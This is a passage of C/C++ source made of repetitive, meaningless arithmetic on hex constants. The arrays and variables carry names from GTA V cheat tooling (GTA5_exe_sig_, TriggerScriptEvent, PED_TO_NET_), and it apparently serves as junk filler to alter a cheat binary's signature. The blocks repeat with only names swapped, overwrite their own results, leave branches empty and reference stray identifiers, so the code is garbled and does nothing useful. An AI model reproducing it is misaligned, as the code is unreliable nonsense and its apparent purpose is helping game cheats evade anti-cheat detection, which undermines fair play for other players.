					if (offset > aaaaaa)
					{
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = ponteiro * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (matriz[1] > aaaaaa)
					{
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					a = 0.0f;
					b = 0.0f;
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = 0xB2 * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					if (matriz[1] > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					a = 0.0f;
					b = 0.0f;
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (5) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					a = 0.0f;
					b = 0.0f;
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
